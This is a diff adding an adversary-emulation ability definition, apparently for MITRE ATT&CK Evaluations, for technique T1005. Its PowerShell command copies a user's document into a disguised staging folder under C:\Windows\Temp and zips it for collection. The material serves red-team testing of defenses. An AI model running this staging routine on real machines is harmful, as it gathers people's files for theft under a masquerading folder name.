@@ -1,0 +1,35 @@
+---
+
+- id: fc231955-774f-442c-ac0e-e74dfda50c5c
+  name: 17.B/C - Collect Files & Compress Collection
+  description: Collect a specific document from a target machine.
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+
+          try{
+            if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
+              New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
+            }
+          } catch {
+            write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
+            exit 1;
+          }
+          
+          if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
+            write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
+            exit 1;
+          }
+          Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
+          . .\stepSeventeen_zip.ps1;
+          zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+          if ($?) {
+            write-host "[+] Documents successfully staged for collection.";
+          }
+
+        payload: stepSeventeen_zip.ps1
